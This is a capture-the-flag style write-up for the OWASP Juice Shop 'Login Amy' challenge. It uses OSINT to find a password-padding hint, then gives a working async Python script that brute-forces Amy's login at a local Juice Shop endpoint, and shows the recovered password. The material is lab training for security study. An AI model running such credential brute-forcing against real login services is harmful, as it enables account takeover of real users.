# Login Amy

**Difficulty**: :star2::star2::star2:

**Description**: Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")

**Category**: Sensitive Data Exposure

**Tags**: `OSINT`

**Solution**:

So I tried to search for the term "93.83 billion trillion trillion centuries" and found this blog:

![search for term](https://user-images.githubusercontent.com/64480713/180432555-5f5f9426-2f35-41b9-88b6-60016589e658.png)

When I scroll down the blog, I found a note about "One Important Final Note":

![one important final note](https://user-images.githubusercontent.com/64480713/180432728-3187f23d-ad44-4d4a-8573-243d3ca183ce.png)

And I found a snippet of code to brute force Amy's password:

Tested on:

Python: 3.10.4
aiohttp = "3.8.1"

<details>
<summary>Snippet code</summary>

```python
import asyncio

import aiohttp

your_juice_shop_url = "http://localhost:3000{}".format("/rest/user/login")


def build_queue():

    queue = []

    uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase_letters = "abcdefghijklmniopqrstuvxyz"
    numbers = "0123456789"

    for up_letter in uppercase_letters:
        for low_letter in lowercase_letters:
            for number in numbers:
                queue.append(f"{up_letter}{number}{low_letter}.....................")
    return queue


async def login_amy(name, async_queue):

    async with aiohttp.ClientSession() as session:
        while not async_queue.empty():
            password = await async_queue.get()
            print(f"Task {name}:\t Trying password: {password}")
            async with session.post(
                your_juice_shop_url,
                json={"email": "amy@juice-sh.op", "password": password},
            ) as response:
                await response.text()


async def main(password_queue):

    async_queue = asyncio.Queue()

    for password in password_queue:
        await async_queue.put(password)

    await asyncio.gather(
        asyncio.create_task(login_amy("One", async_queue)),
        asyncio.create_task(login_amy("Two", async_queue)),
        asyncio.create_task(login_amy("Three", async_queue)),
        asyncio.create_task(login_amy("Four", async_queue)),
        asyncio.create_task(login_amy("Five", async_queue)),
    )

    return False


if __name__ == "__main__":
    password_queue = build_queue()
    asyncio.run(main(password_queue))
```

</details>

Then I use Wireshark to capture packages:

![capture packages](https://user-images.githubusercontent.com/64480713/180433342-eda69500-69dc-4da5-b4b1-108ecc26b03d.png)

As you can see, only one request was responded to with the status `200 OK`:

![success package](https://user-images.githubusercontent.com/64480713/180433562-132d276a-bbb1-43b2-be3f-8d361dd2d631.png)

And it was the response to a request with the password **`K1f.....................`**:

![image](https://user-images.githubusercontent.com/64480713/180433668-4486b246-22b3-47c6-81e7-a3068d03c93f.png)

Finally, I logged in successfully to Amy's account with this information:

![login successfully](https://user-images.githubusercontent.com/64480713/180433905-c5ed4a67-220c-4a0d-b50c-68f4035afdf7.png)



